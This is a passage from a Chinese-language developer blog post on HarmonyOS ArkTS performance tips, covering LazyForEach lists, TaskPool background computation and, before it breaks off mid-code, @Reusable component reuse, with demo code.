                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Hello，兄弟们，我是 V 哥！</p>
<p>昨天有个粉丝在群里哭诉：“V 哥，我用鸿蒙 API 21 写的 App，在模拟器上跑得像法拉利，一到真机老款机型上，划一下屏幕顿两下，简直像在开拖拉机！产品经理都快把我的键盘砸烂了！”</p>
<p>我心想，有没有可能不是手机不行，这是<strong>代码没写对</strong>呢！</p>
<p>很多兄弟从 Android 或者 Vue 转过来，习惯性地把以前那套“暴力渲染”的逻辑搬到 ArkTS 上。在 API 21 这个新版本上，鸿蒙的渲染引擎虽然强，但你不按它的套路出牌，它照样给你摆烂。</p>
<p>今天，V 哥就掏出压箱底的**“性能三板斧”**。这三招，只要你能消化哪怕一招，你的 App 流畅度立马提升一个档次。咱们直接上 DevEco Studio 6.0 的实战代码，开整！</p>
<hr/>
<h2 data-id="heading-0">第一招：长列表别用 ForEach，LazyForEach 才是YYDS</h2>
<h3 data-id="heading-1">痛点在哪？</h3>
<p>很多兄弟写列表，习惯性上 <code>ForEach</code>。V 哥必须提醒你：<strong><code>ForEach</code> 是一次性渲染</strong>。如果你的数据有几百条、几千条，它会啪一下一下子把所有组件全创建出来。内存瞬间爆炸，CPU 飙升，卡顿是必然的！</p>
<h3 data-id="heading-2">解决方案</h3>
<p>API 21 下，必须要用 <strong><code>LazyForEach</code></strong>（懒加载）。它的核心逻辑是：<strong>只渲染屏幕可见的那几个 Item，你滑下来一个，我再创建一个，滑上去销毁一个</strong>。内存占用极低，丝般顺滑。</p>
<h3 data-id="heading-3">代码实战</h3>
<p>兄弟们，这部分代码比较经典，建议直接复制到你的 <code>DevEco Studio</code> 里跑一跑。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 1. 定义基础的数据源接口。这是 LazyForEach 必须要实现的规矩</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">IBasicDataSource</span> {
  <span class="hljs-title function_">totalCount</span>(): <span class="hljs-built_in">number</span>;
  <span class="hljs-title function_">getData</span>(<span class="hljs-attr">index</span>: <span class="hljs-built_in">number</span>): <span class="hljs-title class_">Object</span>;
  <span class="hljs-title function_">registerDataChangeListener</span>(<span class="hljs-attr">listener</span>: <span class="hljs-title class_">IDataChangeListener</span>): <span class="hljs-built_in">void</span>;
  <span class="hljs-title function_">unregisterDataChangeListener</span>(<span class="hljs-attr">listener</span>: <span class="hljs-title class_">IDataChangeListener</span>): <span class="hljs-built_in">void</span>;
}

<span class="hljs-comment">// 2. 重命名以避免冲突 - 修复第10行错误</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">IDataChangeListener</span> {
  <span class="hljs-title function_">onDataReloaded</span>(): <span class="hljs-built_in">void</span>;
  <span class="hljs-title function_">onDataAdded</span>(<span class="hljs-attr">index</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">void</span>;
  <span class="hljs-title function_">onDataChanged</span>(<span class="hljs-attr">index</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">void</span>;
  <span class="hljs-title function_">onDataDeleted</span>(<span class="hljs-attr">index</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">void</span>;
  <span class="hljs-title function_">onDataMoved</span>(<span class="hljs-attr">from</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">to</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">void</span>;
}

<span class="hljs-comment">// 3. 实现数据变化监听器 - 使用新名称</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DataChangeCallback</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IDataChangeListener</span> {
  <span class="hljs-title function_">onDataReloaded</span>(): <span class="hljs-built_in">void</span> {}
  <span class="hljs-title function_">onDataAdded</span>(<span class="hljs-attr">index</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">void</span> {}
  <span class="hljs-title function_">onDataChanged</span>(<span class="hljs-attr">index</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">void</span> {}
  <span class="hljs-title function_">onDataDeleted</span>(<span class="hljs-attr">index</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">void</span> {}
  <span class="hljs-title function_">onDataMoved</span>(<span class="hljs-attr">from</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">to</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">void</span> {}
}

<span class="hljs-comment">// 4. 核心数据源类（V哥精简版）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyDataSource</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IBasicDataSource</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">listeners</span>: <span class="hljs-title class_">IDataChangeListener</span>[] = [];
  <span class="hljs-keyword">private</span> <span class="hljs-attr">dataList</span>: <span class="hljs-built_in">string</span>[] = [];

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">list: <span class="hljs-built_in">string</span>[]</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dataList</span> = list;
  }

  <span class="hljs-title function_">totalCount</span>(): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">dataList</span>.<span class="hljs-property">length</span>;
  }

  <span class="hljs-title function_">getData</span>(<span class="hljs-attr">index</span>: <span class="hljs-built_in">number</span>): <span class="hljs-title class_">Object</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">dataList</span>[index];
  }

  <span class="hljs-title function_">registerDataChangeListener</span>(<span class="hljs-attr">listener</span>: <span class="hljs-title class_">IDataChangeListener</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">listeners</span>.<span class="hljs-title function_">indexOf</span>(listener) &lt; <span class="hljs-number">0</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">listeners</span>.<span class="hljs-title function_">push</span>(listener);
    }
  }

  <span class="hljs-title function_">unregisterDataChangeListener</span>(<span class="hljs-attr">listener</span>: <span class="hljs-title class_">IDataChangeListener</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-keyword">const</span> pos = <span class="hljs-variable language_">this</span>.<span class="hljs-property">listeners</span>.<span class="hljs-title function_">indexOf</span>(listener);
    <span class="hljs-keyword">if</span> (pos &gt;= <span class="hljs-number">0</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">listeners</span>.<span class="hljs-title function_">splice</span>(pos, <span class="hljs-number">1</span>);
    }
  }

  <span class="hljs-keyword">public</span> <span class="hljs-title function_">addData</span>(<span class="hljs-params">data: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dataList</span>.<span class="hljs-title function_">push</span>(data);
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">notifyDataReloaded</span>();
  }

  <span class="hljs-keyword">private</span> <span class="hljs-title function_">notifyDataReloaded</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">listeners</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">listener</span> =&gt;</span> {
      listener.<span class="hljs-title function_">onDataReloaded</span>();
    });
  }
}

<span class="hljs-comment">// 简化数据变更监听器</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleDataChangeCallback</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">DataChangeCallback</span> {
  <span class="hljs-title function_">onDataReloaded</span>(): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"数据已重新加载，UI可以刷新"</span>);
  }
}

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">LazyForEachDemo</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">dataSource</span>: <span class="hljs-title class_">MyDataSource</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyDataSource</span>([]);

  <span class="hljs-comment">// 使用新的监听器类型</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">listener</span>: <span class="hljs-title class_">SimpleDataChangeCallback</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDataChangeCallback</span>();

  <span class="hljs-title function_">aboutToAppear</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 预先生成数据</span>
    <span class="hljs-keyword">const</span> <span class="hljs-attr">initData</span>: <span class="hljs-built_in">string</span>[] = [];
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
      initData.<span class="hljs-title function_">push</span>(<span class="hljs-string">'V哥带你飞 - 第 '</span> + (i + <span class="hljs-number">1</span>) + <span class="hljs-string">' 条数据'</span>);
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dataSource</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyDataSource</span>(initData);

    <span class="hljs-comment">// 注册数据变化监听器</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dataSource</span>.<span class="hljs-title function_">registerDataChangeListener</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">listener</span>);
  }

  <span class="hljs-title function_">aboutToDisappear</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 取消注册数据变化监听器</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dataSource</span>.<span class="hljs-title function_">unregisterDataChangeListener</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">listener</span>);
  }

  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-comment">// 标题</span>
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'LazyForEach 性能演示'</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">20</span>)
        .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span>)
        .<span class="hljs-title function_">margin</span>(<span class="hljs-number">10</span>)

      <span class="hljs-title class_">List</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">5</span> }) {
        <span class="hljs-title class_">LazyForEach</span>(
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">dataSource</span>,
          <span class="hljs-function">(<span class="hljs-params">item: <span class="hljs-built_in">string</span>, index?: <span class="hljs-built_in">number</span></span>) =&gt;</span> {
            <span class="hljs-title class_">ListItem</span>() {
              <span class="hljs-variable language_">this</span>.<span class="hljs-title class_">ListItemChild</span>(item)
            }
          },
          <span class="hljs-function">(<span class="hljs-params">item: <span class="hljs-built_in">string</span>, index?: <span class="hljs-built_in">number</span></span>) =&gt;</span> {
            <span class="hljs-comment">// 返回索引作为唯一标识</span>
            <span class="hljs-keyword">if</span> (index === <span class="hljs-literal">undefined</span>) {
              <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>().<span class="hljs-title function_">toString</span>();
            }
            <span class="hljs-keyword">return</span> index.<span class="hljs-title function_">toString</span>();
          }
        )
      }
      .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
      .<span class="hljs-title function_">height</span>(<span class="hljs-string">'85%'</span>)
      .<span class="hljs-title function_">layoutWeight</span>(<span class="hljs-number">1</span>)

      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'模拟增加数据'</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">dataSource</span>.<span class="hljs-title function_">addData</span>(<span class="hljs-string">'新数据 '</span> + (<span class="hljs-variable language_">this</span>.<span class="hljs-property">dataSource</span>.<span class="hljs-title function_">totalCount</span>() + <span class="hljs-number">1</span>));
        })
        .<span class="hljs-title function_">margin</span>(<span class="hljs-number">10</span>)
        .<span class="hljs-title function_">width</span>(<span class="hljs-string">'50%'</span>)
    }
    .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-string">'100%'</span>)
  }

  <span class="hljs-comment">// 将子组件改为build方法内的组件构建器</span>
  <span class="hljs-meta">@Builder</span>
  <span class="hljs-title class_">ListItemChild</span>(<span class="hljs-attr">content</span>: <span class="hljs-built_in">string</span>) {
    <span class="hljs-title class_">Row</span>() {
      <span class="hljs-title class_">Text</span>(content)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">14</span>)
        .<span class="hljs-title function_">flexGrow</span>(<span class="hljs-number">1</span>)
        .<span class="hljs-title function_">textAlign</span>(<span class="hljs-title class_">TextAlign</span>.<span class="hljs-property">Start</span>)
        .<span class="hljs-title function_">padding</span>(<span class="hljs-number">10</span>)
    }
    .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-number">60</span>)
    .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-string">'#f0f0f0'</span>)
    .<span class="hljs-title function_">borderRadius</span>(<span class="hljs-number">8</span>)
    .<span class="hljs-title function_">margin</span>({ <span class="hljs-attr">left</span>: <span class="hljs-number">10</span>, <span class="hljs-attr">right</span>: <span class="hljs-number">10</span>, <span class="hljs-attr">top</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">bottom</span>: <span class="hljs-number">2</span> })
  }
}
</code></pre>
<p><strong>V 哥划重点：</strong></p>
<ol>
<li>千万别懒，一定要实现 <code>IDataSource</code>。</li>
<li><code>LazyForEach</code> 的第三个参数（key生成函数）一定要写，而且要保证唯一性！这是组件复用的身份证，写错了渲染必乱。</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c1b3b234d914400b96ff8963c8458445~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aiB5ZOl54ix57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768986607&amp;x-signature=2Gfxi%2Ftjd6ZPnKwM9ET65ksmM%2BA%3D" alt="" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-4">第二招：别在主线程算数，TaskPool 帮你搬砖</h2>
<h3 data-id="heading-5">痛点在哪？</h3>
<p>你是不是经常在点击事件里直接写大量逻辑？比如解析巨大的 JSON、图片滤镜处理、复杂算法排序？<strong>兄弟，那是主线程（UI线程）啊！</strong> 你在那算数，UI 就得等着，屏幕当然卡死不动。</p>
<h3 data-id="heading-6">解决方案</h3>
<p>API 21 推荐使用 <strong><code>TaskPool</code>（任务池）</strong>。把重活累活扔给后台线程池去干，算完了结果一扔，主线程只负责展示。分工明确，效率翻倍。</p>
<h3 data-id="heading-7">代码实战</h3>
<p>咱们模拟一个“复杂排序”的场景，看 V 哥怎么用 TaskPool 优化。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> taskpool <span class="hljs-keyword">from</span> <span class="hljs-string">'@ohos.taskpool'</span>;

<span class="hljs-comment">// 1. 定义一个并发函数（这是在后台线程跑的）</span>
<span class="hljs-comment">// 注意：@Concurrent 装饰器是必须的，这是 ArkTS 并发编程的标识</span>
<span class="hljs-meta">@Concurrent</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">heavyComputation</span>(<span class="hljs-params">data: <span class="hljs-built_in">number</span>[]</span>): <span class="hljs-built_in">number</span>[] {
  <span class="hljs-comment">// V 哥模拟一个超级耗时的排序操作</span>
  <span class="hljs-comment">// 比如这里可以换成复杂的 JSON 解析、加密解密等</span>
  <span class="hljs-keyword">let</span> arr = [...data];
  arr.<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a - b);

  <span class="hljs-comment">// 模拟耗时，让兄弟们看到效果</span>
  <span class="hljs-keyword">let</span> start = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>();
  <span class="hljs-keyword">while</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>() - start &lt; <span class="hljs-number">500</span>) {
    <span class="hljs-comment">// 故意卡住 500毫秒，如果在主线程，UI会完全冻结</span>
  }

  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(<span class="hljs-string">"V哥后台线程计算完毕！"</span>);
  <span class="hljs-keyword">return</span> arr;
}

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">TaskPoolDemo</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'点击按钮开始计算'</span>;
  <span class="hljs-meta">@State</span> <span class="hljs-attr">resultString</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'结果等待中...'</span>;
  <span class="hljs-meta">@State</span> <span class="hljs-attr">isCalculating</span>: <span class="hljs-built_in">boolean</span> = <span class="hljs-literal">false</span>;

  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">message</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">20</span>)
        .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span>)
        .<span class="hljs-title function_">margin</span>({ <span class="hljs-attr">top</span>: <span class="hljs-number">20</span>, <span class="hljs-attr">bottom</span>: <span class="hljs-number">20</span> })

      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">isCalculating</span>) {
        <span class="hljs-title class_">LoadingProgress</span>()
          .<span class="hljs-title function_">width</span>(<span class="hljs-number">50</span>)
          .<span class="hljs-title function_">height</span>(<span class="hljs-number">50</span>)
          .<span class="hljs-title function_">color</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">Blue</span>)
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title class_">Text</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">resultString</span>)
          .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">16</span>)
          .<span class="hljs-title function_">fontColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">Gray</span>)
          .<span class="hljs-title function_">margin</span>({ <span class="hljs-attr">bottom</span>: <span class="hljs-number">20</span> })
      }

      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'使用 TaskPool 后台计算'</span>)
        .<span class="hljs-title function_">enabled</span>(!<span class="hljs-variable language_">this</span>.<span class="hljs-property">isCalculating</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">startCalculation</span>();
        })
    }
    .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">justifyContent</span>(<span class="hljs-title class_">FlexAlign</span>.<span class="hljs-property">Center</span>)
    .<span class="hljs-title function_">padding</span>(<span class="hljs-number">20</span>)
  }

  <span class="hljs-comment">// 将计算逻辑提取为独立方法</span>
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">async</span> <span class="hljs-title function_">startCalculation</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isCalculating</span> = <span class="hljs-literal">true</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">message</span> = <span class="hljs-string">"正在后台拼命算数中..."</span>;

    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// 准备一些乱序数据</span>
      <span class="hljs-keyword">let</span> <span class="hljs-attr">rawData</span>: <span class="hljs-built_in">number</span>[] = [];
      <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
        rawData.<span class="hljs-title function_">push</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">10000</span>);
      }

      <span class="hljs-comment">// 修复：使用正确的 TaskPool API</span>
      <span class="hljs-comment">// 方式1：直接执行函数（推荐）</span>
      <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> taskpool.<span class="hljs-title function_">execute</span>(heavyComputation, rawData) <span class="hljs-keyword">as</span> <span class="hljs-built_in">number</span>[];

      <span class="hljs-comment">// 计算完成，回到主线程（这里会自动切回来，放心用UI）</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">isCalculating</span> = <span class="hljs-literal">false</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">message</span> = <span class="hljs-string">"计算完成！UI丝滑不卡顿！"</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">resultString</span> = <span class="hljs-string">`前5个数据: <span class="hljs-subst">${result.slice(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>).join(<span class="hljs-string">', '</span>)}</span>`</span>;

    } <span class="hljs-keyword">catch</span> (err) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">isCalculating</span> = <span class="hljs-literal">false</span>;
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`V哥报错: <span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(err)}</span>`</span>);
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">message</span> = <span class="hljs-string">"计算失败！"</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">resultString</span> = <span class="hljs-string">`错误信息: <span class="hljs-subst">${err}</span>`</span>;
    }
  }
}
</code></pre>
<p>这个案例需要真机测试，V 哥使用新入手的MatePad Pro：
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9303650b045a4ade88a19ec2f06b1744~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aiB5ZOl54ix57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768986607&amp;x-signature=ywrI9gjvBEqhgqzB%2B0lx4KB1kCM%3D" alt="" loading="lazy"/></p>
<p>以下是单击按钮后运行的结果：
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/66dff9c57f1749b59520f13fe2b4d07e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aiB5ZOl54ix57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768986607&amp;x-signature=ZCgDp0dhA%2Bn4m8pGPkxTB2hWvQ8%3D" alt="" loading="lazy"/></p>
<p><strong>V 哥划重点：</strong></p>
<ol>
<li>记得给函数加 <code>@Concurrent</code>，否则扔不进 TaskPool。</li>
<li>TaskPool 是自动管理线程的，你别自己 new Thread，那样太低级且容易OOM。</li>
<li>记住，<strong>UI 只能更新状态，不能做重活</strong>。</li>
</ol>
<hr/>
<h2 data-id="heading-8">第三招：组件别总造新的，@Reusable 复用才省钱</h2>
<h3 data-id="heading-9">痛点在哪？</h3>
<p>在列表滑动或者页面切换时，如果频繁创建和销毁组件（比如 <code>new ChildComponent()</code>），GC（垃圾回收）压力会非常大，导致内存抖动，表现就是<strong>掉帧</strong>。</p>
<h3 data-id="heading-10">解决方案</h3>
<p>API 21 提供了一个非常强力的装饰器：<strong><code>@Reusable</code></strong>。它的作用是：<strong>组件不从树上卸载，而是回收到缓存池里，下次需要的时候直接拿过来改个数据接着用</strong>。这简直是“物尽其用”的典范！</p>
<h3 data-id="heading-11">代码实战</h3>
<p>咱们看怎么改造刚才的 <code>ListItemChild</code> 组件。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 定义一个复用的数据模型，方便传递</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ListItemParams</span> {
  <span class="hljs-attr">content</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">""</span>;
  <span class="hljs-attr">color</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">"#ffffff"</span>;
}

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">ReusableDemo</span> {
  <span class="hljs-comment">// 模拟数据</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">dataList</span>: <span class="hljs-title class_">ListItemParams</span>[] = [];

  <span class="hljs-title function_">aboutToAppear</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 在生命周期中初始化数据，避免在构建时执行复杂逻辑</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
      <span class="hljs-keyword">let</span> item = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ListItemParams</span>();
      item.<span class="hljs-property">content</span> = <span class="hljs-string">`可复用组件 Item <span class="hljs-subst">${i + <span class="hljs-number">1</span>}</span>`</span>;
      item.<span class="hljs-property">color</span> = i % <span class="hljs-number">2</span> === <span class="hljs-number">0</span> ? <span class="hljs-string">'#e0e0e0'</span> : <span class="hljs-string">'#ffffff'</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">dataList</span>.<span class="hljs-title function_">push</span>(item);
    }
  }

  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
